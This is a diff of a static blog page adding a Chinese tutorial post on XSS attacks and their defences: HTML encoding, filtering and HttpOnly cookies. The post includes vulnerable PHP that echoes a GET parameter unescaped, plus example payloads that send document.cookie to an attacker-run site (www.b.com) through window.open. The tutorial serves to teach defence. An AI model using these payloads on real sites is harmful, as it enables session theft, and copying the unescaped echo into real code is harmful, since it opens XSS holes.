@@ -81,6 +81,96 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/2016/04/08/xssattack/" title="xss攻击" itemprop="url">xss攻击</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="lianMo" target="_blank" itemprop="author">lianMo</a>
+		
+  <p class="article-time">
+    <time datetime="2016-04-08T08:21:08.000Z" itemprop="datePublished"> 发表于 2016-04-08</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>继续来研究一下网站安全的工作，这次要介绍的是xss，跨站脚本攻击(Cross Site Scripting)。</p>
+<h3 id="什么是XSS？"><a href="#什么是XSS？" class="headerlink" title="什么是XSS？"></a>什么是XSS？</h3><p>XSS全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且<br>用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)<br>恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。<br>如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>
+<p>XSS攻击的漏洞主要有两种：</p>
+<p>#####　1.DOM BASED XSS<br>基于网页DOM结构的攻击，也称作非持久性XSS攻击，因为这种攻击是一次性的，非持久型xss攻击要求用户<br>访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p>
+<h6 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h6><p>网站A某页面使用GET传参的方法动态加载页面，例如url: www.a.com/a.php?para=1;<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> para = &lt;?php echo $_GET['para'];?&gt;;</span><br><span class="line">.....</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在这个页面，把url里边的参数直接的引用到了页面内容(即DOM)里边，而没有做任何检查工作。<br>于是就有了XSS攻击的漏洞了。<br>接着用户B是这个网站的用户，黑客C发送了一条链接给他：<br>www.a.com/a.php?para=window.open(“www.b.com?para=”+document.cookie)<br>网站b是黑客搭建的用于接收这些被盗取的cookie，当用户点击该链接时，网站a就被注入了恶意脚本，<br>在自己的浏览器端执行了发送cookie的请求命令，这些恶意脚本并不会真正地影响服务器端的代码，<br>而仅仅是改变了用户加载到本地的页面内容，浏览器无法识别该内容被修改了照样执行，于是cookie就<br>被盗取了，只有在用户点击这一条被修改过的特定的链接时才会被攻击，因此称为非持久性攻击，攻击<br>原理是基于修改网页内容注入恶意脚本，因此也叫DOM Based XSS。<br>当然，一般的黑客并不会直接使用以上可读形式，而是将其转换成ASCII码，使得用户不可察觉该链接有危险。</p>
+<h5 id="2-Stored-XSS"><a href="#2-Stored-XSS" class="headerlink" title="2.Stored XSS"></a>2.Stored XSS</h5><p>存储式XSS漏洞，也称作持久性攻击，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。<br>影响时间只要管理员不发现则一直存在，与上边没有改变服务器代码相比，Stored XSS的危险性更大，因为它<br>的攻击脚本已经改变了服务器端的内容了，任何用户只要访问了该内容就会收到攻击。</p>
+<h6 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h6><p>网站a提供博客平台，用户可以自己写文章上传到服务器。<br>黑客b在自己的博文里边加入了恶意脚本：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(“www.b.com?para=”+<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当用户d和用户c浏览黑客b的博文时，他们的cookie就被盗取了。因为该博文包含了盗取cookie的脚本，<br>在加载页面式该命令也被执行了。<br>只要管理员不发现没有删除这篇博文，那么只要有人访问就会触发攻击。所以危险比DOM Based XSS还要大。</p>
+<h3 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h3><h5 id="建立完整的过滤体系"><a href="#建立完整的过滤体系" class="headerlink" title="建立完整的过滤体系"></a>建立完整的过滤体系</h5><p>对一切可变的，用户输入的东西都要进行过滤，假如有不能删减改变的则使用转义符号的方法替代特殊字符，<br>毕竟恶意代码也只是代码，破坏了代码结构就无法工作了。</p>
+<p>Html encode<br>       假如某些情况下，我们不能对用户数据进行严格的过滤，那我们也需要对标签进行转换。</p>
+<p><table></table></p>
+<p><tr></tr></p>
+<p><td>less-than character (&lt;)</td></p>
+<p><td>&lt;</td><br></p>
+<p><tr></tr></p>
+<p><td>greater-than character (&gt;) </td></p>
+<p><td>&gt;</td><br></p>
+<p><tr></tr></p>
+<p><td>ampersand character (&amp;) </td></p>
+<p><td>&amp;</td><br></p>
+<p><tr></tr></p>
+<p><td>double-quote character (“)</td></p>
+<p><td>&quot;</td><br></p>
+<p><tr></tr></p>
+<p><td>space character( )</td></p>
+<p><td>&nbsp;</td><br></p>
+<p><tr></tr></p>
+<p><td>Any ASCII code character whose code is greater-than or equal to 0x80</td></p>
+<p><td>&amp;#<number>, where <number> is the ASCII character value.</number></number></td><br><br><br>这样即使黑客注入了脚本也会被转义成无效的字符串。比如用户输入：<script>window.location.href=”<a href="http://www.baidu.com”">http://www.baidu.com”</a>;</script>，保存后最终存储的会是：&lt;script&gt;window.location.href=&quot;<a href="http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。" target="_blank" rel="external">http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</a></p>
+<p>过滤的工作要考虑全面，不仅在输入时过滤，输出时，从GET参数赋值时都要考虑过滤的问题，<br>没有漏洞就大大减少攻击的风险。</p>
+<p>补充：<br><a href="http://lobert.iteye.com/blog/2164741" target="_blank" rel="external">这篇博客</a>提到了一个配置可以阻止浏览器通过js来获取cookie的行为。<br>从而防止黑客盗取用户的cookie。这里就引用一下：</p>
+<p>HttpOnly防止劫取Cookie<br>HttpOnly最早由微软提出，至今已经成为一个标准。浏览器将禁止页面的Javascript访问带有HttpOnly属性的Cookie。目前主流浏览器都支持，HttpOnly解决是XSS后的Cookie支持攻击。</p>
+<p>我们来看下百度有没有使用。<br>未登录时的Cookie信息：<br><img src="http://img.blog.csdn.net/20141205152610171"><br>可以看到，所有Cookie都没有设置HttpOnly，现在我登录下<br><img src="http://img.blog.csdn.net/20141205153514671"><br>发现在个叫BDUSS的Cookie设置了HttpOnly。可以猜测此Cookie用于认证。<br>下面我用PHP来实现下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">header(<span class="string">"Set-Cookie: cookie1=test1;"</span>);  </span><br><span class="line">header(<span class="string">"Set-Cookie: cookie2=test2;httponly"</span>,<span class="keyword">false</span>);  </span><br><span class="line">  </span><br><span class="line">setcookie(<span class="string">'cookie3'</span>,<span class="string">'test3'</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">false</span>);  </span><br><span class="line">setcookie(<span class="string">'cookie4'</span>,<span class="string">'test4'</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">true</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">&lt;script&gt;  </span><br><span class="line">    alert(document.cookie);  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://img.blog.csdn.net/20141205154702687"><br>结果：<br><img src="http://img.blog.csdn.net/20141205154518194"><br>js只能读到没有HttpOnly标识的Cookie1,3,4，而有保护的2则不能被读取。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>XSS攻击类似于sql注入攻击，虽然防御简单但是往往开发时总会疏忽一两处地方没有做好<br>安全过滤的工作由此给了黑客一个攻击的入口了，可以适当地使用一些查漏洞的软件来检查<br>自己的项目是否有漏洞。</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/网站安全/">网站安全</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/2016/04/07/csrfattack/" title="CSRF跨域伪造攻击" itemprop="url">CSRF跨域伪造攻击</a>
   </h1>
   <p class="article-author">By
@@ -244,7 +334,7 @@ PHP：只需要使用如下的代码设置即可。
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/ajax/">ajax</a><a href="/tags/跨域/">跨域</a>
+  <span></span> <a href="/tags/跨域/">跨域</a><a href="/tags/ajax/">ajax</a>
   </div>
 
 </div>
@@ -473,7 +563,7 @@ PHP：只需要使用如下的代码设置即可。
 			
 		
 			
-				<li><a href="/tags/js/" title="js">js<sup>1</sup></a></li>
+				<li><a href="/tags/网站安全/" title="网站安全">网站安全<sup>2</sup></a></li>
 			
 		
 			
@@ -481,7 +571,7 @@ PHP：只需要使用如下的代码设置即可。
 			
 		
 			
-				<li><a href="/tags/网站安全/" title="网站安全">网站安全<sup>1</sup></a></li>
+				<li><a href="/tags/js/" title="js">js<sup>1</sup></a></li>
 			
 		
 			
